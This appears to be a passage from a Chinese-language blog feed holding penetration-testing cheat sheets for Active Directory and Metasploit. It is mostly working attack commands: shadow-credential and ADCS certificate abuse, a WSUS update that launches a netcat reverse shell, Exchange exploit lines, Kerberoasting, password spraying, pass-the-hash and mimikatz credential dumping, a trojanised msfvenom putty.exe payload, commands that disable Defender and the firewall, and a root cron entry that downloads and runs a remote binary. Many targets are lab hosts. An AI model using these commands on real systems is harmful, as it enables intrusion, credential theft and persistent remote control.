class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1.Shadow Credentials</span><br><span class="line"></span><br><span class="line">前提：</span><br><span class="line"></span><br><span class="line">1.一个系统版本至少为 Windows Server 2016 的域控制器。</span><br><span class="line">2.安装在域控制器上的服务器身份验证数字证书。</span><br><span class="line">3.以下账户拥有 msDS-KeyCredentialLink 属性的写入权限：</span><br><span class="line"></span><br><span class="line">域管理员账户</span><br><span class="line">Key Admins 组中的账户</span><br><span class="line">Enterprise Key Admins 组中的账户</span><br><span class="line">对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户</span><br><span class="line">机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Whisker.exe list /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb <span class="comment">#查看条目</span></span><br><span class="line">Whisker.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:0xdf0xdf <span class="comment">#添加一个，成功会给出后续攻击命令</span></span><br><span class="line"></span><br><span class="line">当然也可以用py版本的</span><br><span class="line"></span><br><span class="line">python3 pywhisker.py --action list -d outdated.htb -u btables -p 5myBPLPDKT3Bfq --dc-ip 10.10.11.175 -t sflowers --use-ldaps <span class="comment">#查看影子凭据</span></span><br><span class="line"></span><br><span class="line">python3 pywhisker.py --action add -d outdated.htb -u btables -p 5myBPLPDKT3Bfq --dc-ip 10.10.11.175 -t sflowers --use-ldaps <span class="comment">#添加影子凭据,会给出后续命令,建议用PKINITtools</span></span><br><span class="line"></span><br><span class="line">python3 gettgtpkinit.py -cert-pfx alTWylpv.pfx -pfx-pass CpgwxPvDtXvsf4wNjjgN outdated.htb/sflowers sflowers.ccache -dc-ip 10.10.11.175</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=sflowers.ccache </span><br><span class="line">python3 getnthash.py outdated.htb/sflowers -key 91229b2482fcba24d91bd4a57e5d04cd403eba67c60a83d70ff39a72ee571f8f</span><br><span class="line"></span><br><span class="line"><span class="comment">#中间可能会出现时间错误等问题</span></span><br><span class="line">ntpdate 10.10.11.175 <span class="comment">#同步域控</span></span><br><span class="line"></span><br><span class="line">ntpdate ntp1.aliyun.com <span class="comment">#恢复时间</span></span><br><span class="line"></span><br><span class="line">WSUS也就是windows server update service</span><br><span class="line"></span><br><span class="line">SharpWSUS.exe locate <span class="comment">#列举</span></span><br><span class="line"></span><br><span class="line">SharpWSUS.exe inspect <span class="comment">#查看</span></span><br><span class="line"></span><br><span class="line">SharpWSUS.exe create /payload:<span class="string">&quot;C:\programdata\psexec.exe&quot;</span> /args:<span class="string">&quot; -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445&quot;</span> /title:<span class="string">&quot;CVE-2022-30190&quot;</span> <span class="comment">#创建事件，会给出后续命令</span></span><br><span class="line"></span><br><span class="line">approve /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:dc.outdated.htb /groupname:<span class="string">&quot;CriticalPatches&quot;</span> <span class="comment">#当然这个groupname可以随便写</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-ESC1-ESC8"><a href="#2-ESC1-ESC8" class="headerlink" title="2.ESC1-ESC8"></a>2.ESC1-ESC8</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">adcs攻击面.pdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Certify.exe find /vulnerable <span class="comment">#检查漏洞，Certify.exe工具有1个DLL依赖，需要复制到同目录下Interop.CERTENROLLLib.dll</span></span><br><span class="line"></span><br><span class="line">Certify.exe request /ca:CA.test.com\test-CA-CA /template:ESC1 /altname:administrator <span class="comment">#template看上面的信息</span></span><br><span class="line"></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> cert.pem -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptograhic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert.pfx <span class="comment">#这个命令上述给的</span></span><br><span class="line"></span><br><span class="line">Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password: /ptt <span class="comment">#申请票据就行 /getcredentials /show</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; 1.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">此外，也可以通过 AdFind 等工具直接查询活动目录，并过滤出所有不需要批准/授权签名、具有客户端</span><br><span class="line">身份验证或智能卡登录 EKU 并启用 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 标志的证书模板，相关语</span><br><span class="line">法如下。</span><br><span class="line"></span><br><span class="line">AdFind.exe -b <span class="string">&quot;CN=Configuration,DC=pentest,DC=com&quot;</span> -f <span class="string">&quot;(&amp;</span></span><br><span class="line"><span class="string">(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)</span></span><br><span class="line"><span class="string">(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)</span></span><br><span class="line"><span class="string">(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个语法可能是启用某个功能证书模板</span></span><br><span class="line"></span><br><span class="line">智能卡登录攻击PoshADCS </span><br><span class="line"></span><br><span class="line">查找模板.\certify.exe find</span><br><span class="line"></span><br><span class="line">CA Name                               : earth.windcorp.htb\windcorp-CA</span><br><span class="line">    Template Name                         : Web</span><br><span class="line">    Schema Version                        : 2</span><br><span class="line">    Validity Period                       : 10 years</span><br><span class="line">    Renewal Period                        : 6 weeks</span><br><span class="line">    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line">    mspki-enrollment-flag                 : PUBLISH_TO_DS</span><br><span class="line">    Authorized Signatures Required        : 0</span><br><span class="line">    pkiextendedkeyusage                   : Server Authentication</span><br><span class="line">    mspki-certificate-application-policy  : Server Authentication</span><br><span class="line"></span><br><span class="line">修改智能卡登录模板</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">&quot;http://10.10.14.64/PowerView.ps1</span></span><br><span class="line"><span class="string">IEX (New-Object Net.WebClient).DownloadString(&quot;</span>http://10.10.14.64/ADCS.ps1</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">&quot;http://10.10.14.64/Reconfigure-Template.ps1&quot;</span>)</span><br><span class="line"></span><br><span class="line">Reconfigure-Template.ps1</span><br><span class="line"></span><br><span class="line"><span class="variable">$Properties</span> = @&#123;&#125;</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;mspki-certificate-name-flag&#x27;</span>,1)</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;pkiextendedkeyusage&#x27;</span>,@(<span class="string">&#x27;1.3.6.1.4.1.311.20.2.2&#x27;</span>,<span class="string">&#x27;1.3.6.1.5.5.7.3.2&#x27;</span>))</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;msPKI-Certificate-Application-Policy&#x27;</span>,@(<span class="string">&#x27;1.3.6.1.4.1.311.20.2.2&#x27;</span>,<span class="string">&#x27;1.3.6.1.5.5.7.3.2&#x27;</span>))</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;flags&#x27;</span>,<span class="string">&#x27;CLEAR&#x27;</span>)</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;mspki-enrollment-flag&#x27;</span>,0)</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;mspki-private-key-flag&#x27;</span>,256)</span><br><span class="line"><span class="variable">$Properties</span>.Add(<span class="string">&#x27;pkidefaultkeyspec&#x27;</span>,1)</span><br><span class="line"></span><br><span class="line">Set-ADCSTemplate -Name Web -Properties <span class="variable">$Properties</span> -Force</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line">第二步</span><br><span class="line">.\Certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:Administrator</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> cert.pem -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert.pfx</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password123 /getcredentials /show</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-ADCS-–-CVE-2022-26923-冒充域控机器账户实现权限提升"><a href="#3-ADCS-–-CVE-2022-26923-冒充域控机器账户实现权限提升" class="headerlink" title="3.ADCS – CVE-2022-26923 冒充域控机器账户实现权限提升"></a>3.ADCS – CVE-2022-26923 冒充域控机器账户实现权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cve-2022-26923</span><br><span class="line"></span><br><span class="line">1.找到ca name 和dns name</span><br><span class="line"></span><br><span class="line">certipy find <span class="string">&quot;xie.com/test:P@ss1234@10.211.55.4&quot;</span> -debug <span class="comment">#会生成json ，txt文件 可以-dc-ip 指定防止解析到公网</span></span><br><span class="line"></span><br><span class="line">10.211.55.8     CA-Server.xie.com 添加hosts <span class="comment">#一定要添加</span></span><br><span class="line"></span><br><span class="line">2.创建机器账户并且设置dnsname</span><br><span class="line"></span><br><span class="line">certipy account create <span class="string">&quot;xie.com/test:P@ss1234@DC01.xie.com&quot;</span> -dc-ip 10.211.55.4 -user <span class="string">&quot;machine&quot;</span> -dns <span class="string">&#x27;DC01.xie.com&#x27;</span> -debug</span><br><span class="line"></span><br><span class="line">3.请求pfx证书</span><br><span class="line"></span><br><span class="line">certipy req -dc-ip 10.211.55.4 <span class="string">&quot;xie.com/machine$:680dXJBlJ6vy9ycN@CA-Server.xie.com&quot;</span> -ca xie-CA-SERVER-CA -template Machine -debug</span><br><span class="line"></span><br><span class="line">4.获取域控<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">certipy auth -pfx dc01.pfx -dc-ip 10.211.55.4 -debug</span><br></pre></td></tr></table></figure><p><img src="/2023/04/21/Domain-Checklist/003f75f79750de056c9b67d82631a55b.png" alt="img"></p><h2 id="Exchange漏洞"><a href="#Exchange漏洞" class="headerlink" title="Exchange漏洞"></a>Exchange漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">信息收集 CSS-Exchange </span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/sinat_35360663/article/details/127615532 知识点集合</span><br><span class="line"></span><br><span class="line">1.版本识别-网页查看</span><br><span class="line">2.Exchange_GetInternalIP.py exchange服务器内网ip识别</span><br><span class="line">3.定位服务器，<span class="string">&quot;(objectCategory=msExchExchangeServer)&quot;</span> 或者spn定位</span><br><span class="line">setspn -q */*</span><br><span class="line"> </span><br><span class="line">setspn -Q IMAP/*</span><br><span class="line"> </span><br><span class="line">setspn -Q exchange*/*</span><br><span class="line"></span><br><span class="line">4.信息泄露</span><br><span class="line"></span><br><span class="line">/OWA</span><br><span class="line">/Autodiscover</span><br><span class="line">/Exchange</span><br><span class="line">/ecp</span><br><span class="line">/aspnet_client</span><br><span class="line"></span><br><span class="line">5.导出邮件pth PTH_Exchange-main</span><br><span class="line"></span><br><span class="line">6.拿下exchange服务器以后，一般exchange对域内都有writedacl提权，可以直接加dcsync权限</span><br><span class="line"></span><br><span class="line">可以用dacledit.py 或者bloodyAD进行修改</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">历史漏洞</span><br><span class="line">CVE-2018-8581 任意用户伪造漏洞</span><br><span class="line">CVE-2020-0688 远程代码执行漏洞</span><br><span class="line">CVE-2020-16875 远程代码执行漏洞</span><br><span class="line">use exploit/windows/http/exchange_ecp_dlp_policy</span><br><span class="line">CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞</span><br><span class="line">CVE-2020-17143 Microsoft Exchange 信息泄露漏洞</span><br><span class="line">CVE-2020-17144 登录后反序列化漏洞</span><br><span class="line">Proxylogon &amp;&amp; CVE-2021-26855 &amp;&amp; 27065</span><br><span class="line"></span><br><span class="line">exprolog-proxylogin-exchange 可以直接打python3 exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssrf-xss</span><br><span class="line">Proxyshell</span><br><span class="line">ProxyToken</span><br><span class="line">ProxyOracle</span><br><span class="line">ProxyNotShell</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="User-Pass-Fuzz"><a href="#User-Pass-Fuzz" class="headerlink" title="User-Pass-Fuzz"></a>User-Pass-Fuzz</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Kerberoasting</span><br><span class="line"></span><br><span class="line">. .\powerview.ps1</span><br><span class="line"></span><br><span class="line">Get-NetUser -SPN</span><br><span class="line"></span><br><span class="line">rubeus.exe kerberoast /domain:scrm.local /dc:dc1.scrm.local /creduser:scrm.local\ksimpson /credpassword:ksimpson /nowrap</span><br><span class="line"></span><br><span class="line">Rubeus.exe kerberoast /format:hashcat /outfile:hash3.txt <span class="comment">#导出hash</span></span><br><span class="line"></span><br><span class="line">方式二</span><br><span class="line"></span><br><span class="line">传入Invoke-Kerberoast.ps1</span><br><span class="line"></span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring <span class="variable">$true</span> <span class="comment">#关闭安全</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell -c import-module c:\programdata\invoke-kerberoast.ps1; invoke-kerberoast -outputformat hashcat</span><br><span class="line">output <span class="comment">#会返回多个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域用户枚举</span><br><span class="line"></span><br><span class="line">./kerbrute_linux_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab username.txt -t 10</span><br><span class="line"></span><br><span class="line">nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<span class="string">&#x27;aufeng.com&#x27;</span>,userdb=C:\Users\ou\Desktop\user.txt 10.0.0.3</span><br><span class="line"></span><br><span class="line">AS-REPRoasting----不要求Kerberos预身份认证</span><br><span class="line"></span><br><span class="line">GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PrintNightmare 残影卷导出，获取<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">域用户枚举</span><br><span class="line"></span><br><span class="line">ldapsearch -H ldap://hope.windcorp.htb -b <span class="string">&quot;DC=WINDCORP,DC=HTB&quot;</span> sAMAccountName <span class="string">&quot;CN=Users,DC=windcorp,DC=HTB&quot;</span> | grep sAMAccountName | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; domainusers </span><br><span class="line">密码喷洒</span><br><span class="line"></span><br><span class="line">./kerbrute passwordspray -d windcorp.htb domainusers <span class="string">&#x27;!@p%i&amp;J#iNNo1T2&#x27;</span></span><br><span class="line"></span><br><span class="line">ipv6的域用户枚举 htb-apt</span><br><span class="line"></span><br><span class="line">kerbrute userenum -d apt.htb --dc apt.htb <span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">crackmapexec smb htb.local -u henry.vinson -H hashes <span class="comment">#密码爆破容易被锁账户</span></span><br><span class="line"></span><br><span class="line">那么我们可以用pyKerbrute</span><br><span class="line"></span><br><span class="line">python2 kerbBruteHash.py apt.htb htb.local henry.vinson hashes-ntlm </span><br><span class="line"></span><br><span class="line">如果wmiexec和winrm都上不去，可以试试mimikatz的远程登录</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:henry.vinson /domain:htb.local /dc:htb.local /ntlm:e53d87d42adaa3ca32bdb34a876cbffb /command:powershell </span></span><br><span class="line"></span><br><span class="line">注册表查询已经安装软件</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\Software\</span><br><span class="line"></span><br><span class="line">reg query HKCU\SOFTWARE</span><br><span class="line"></span><br><span class="line">reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE</span><br><span class="line"></span><br><span class="line">HKU\SOFTWARE</span><br><span class="line">HKU\SOFTWARE\GiganticHostingManagementSystem</span><br><span class="line">HKU\SOFTWARE\Microsoft</span><br><span class="line">HKU\SOFTWARE\Policies</span><br><span class="line">HKU\SOFTWARE\RegisteredApplications</span><br><span class="line">HKU\SOFTWARE\VMware, Inc.</span><br><span class="line">HKU\SOFTWARE\Wow6432Node</span><br><span class="line">HKU\SOFTWARE\Classes</span><br><span class="line"></span><br><span class="line">reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem</span><br><span class="line"></span><br><span class="line">UserName        REG_SZ   henry.vinson_adm</span><br><span class="line">        PassWord        REG_SZ   G1<span class="comment">#Ny5@2dvht</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> Domain </tag>
            
            <tag> 备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透备忘录</title>
      <link href="/2022/04/22/%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2022/04/22/%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>1.msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.120 LPORT=8818 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o payload4.exe</span><br></pre></td></tr></table></figure><p>-e 指定编码器 -x绑定payload到exe -i 指定编码次数 -f 指定生成payload类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handler -H 192.168.31.120 -P 8818 -p windows/x64/meterpreter/reverse_tcp <span class="comment">#快速监听</span></span><br><span class="line"></span><br><span class="line">search web_d <span class="comment">#找web自动监听模块</span></span><br><span class="line"></span><br><span class="line">ms16_075_reflection_juicy <span class="comment">#烂土豆提权</span></span><br></pre></td></tr></table></figure><p>快速监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span> <span class="comment">#防止session假死</span></span><br><span class="line">run -j -z <span class="comment">#j为后台任务 z为持续监听</span></span><br><span class="line"><span class="built_in">set</span> sessioncommunicationtimeout 0 <span class="comment">#防止300秒杀死session</span></span><br><span class="line"><span class="built_in">set</span> SessionExpirationTimeout 0 <span class="comment">#强制不会杀死session，默认1星期杀死</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4/5:ip:port <span class="comment">#让msf所有模块的流量都通过此代理走。(setg全局设置)</span></span><br><span class="line">msf5 &gt; setg ReverseAllowProxy <span class="literal">true</span> <span class="comment">#允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)</span></span><br><span class="line"><span class="built_in">set</span> AutoRunScript migrate ‐f <span class="comment">#自动迁移进程  AutoRunScript是一个模块，可以自主编写自动脚本</span></span><br><span class="line"><span class="built_in">set</span> autorunscript migrate -n.explorer.exe <span class="comment">#自动迁移到指定进程</span></span><br></pre></td></tr></table></figure><p>2.meterpreter</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester <span class="comment">#win提权模块</span></span><br><span class="line">meterpreter&gt;run post/multi/manage/autoroute <span class="comment">#添加路由</span></span><br><span class="line">meterpreter&gt;migrate <span class="comment">#迁移进程</span></span><br><span class="line"></span><br><span class="line">upload <span class="comment">#上传文件</span></span><br><span class="line">download <span class="comment">#下载文件，建议先打包再下载和上传</span></span><br><span class="line">auxiliary/scanner/discovery/udp_probe <span class="comment">#内网扫描模块，很慢</span></span><br><span class="line"></span><br><span class="line">load kiwi</span><br><span class="line">kiwi_cmd privilege::debug   <span class="comment">#提取权限</span></span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords      <span class="comment">#获取密码</span></span><br><span class="line">run post/windows/manage/enable_rdp <span class="comment">#开启3389</span></span><br><span class="line">portfwd add -l 3389 -p 3389 -r 10.10.1.128 <span class="comment">#端口转发 </span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment">#关闭防火墙</span></span><br><span class="line">netsh advfirewall show allprofiles <span class="comment">#查看防火墙状态</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.30\ipc$ <span class="string">&quot;Whoami2021&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span> <span class="comment">#查看是否开启ipc共享，同hash可以不要后面</span></span><br><span class="line"></span><br><span class="line">然后执行如下命令，使用sc远程在域制器（192.168.93.30）上创建服务关闭防火墙：</span><br><span class="line"></span><br><span class="line">sc \\192.168.93.30 create unablefirewall binpath= <span class="string">&quot;netsh advfirewall set allprofiles state off&quot;</span> <span class="comment">#创建一个服务</span></span><br><span class="line"></span><br><span class="line">sc \\192.168.93.30 start unablefirewall  <span class="comment">#执行这个服务</span></span><br></pre></td></tr></table></figure><p>linux写入计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * wget -qO KdwGEmVm --no-check-certificate http://192.168.1.7:8080/kvMOwncGb; chmod +x KdwGEmVm; ./KdwGEmVm&amp; disown&#x27;</span> &gt;&gt; /hack/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p>docker创建容器和进入容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -it -P ubuntu <span class="comment">#-d 在后台守护进程运行 -it必须加 -P自动端口映射 ubuntu为images名字 --name 指定别名，好识别</span></span><br><span class="line">docker <span class="built_in">exec</span> -it c7188be9bd7b /bin/bash <span class="comment">#当/bin/bash报错，也可以改成/bin/sh</span></span><br><span class="line">docker stop c718 停止运行容器 给10秒反应</span><br><span class="line">docker <span class="built_in">kill</span> c718 直接关闭容器</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">rm</span> </span><br><span class="line">docker rmi</span><br><span class="line"></span><br><span class="line">docker <span 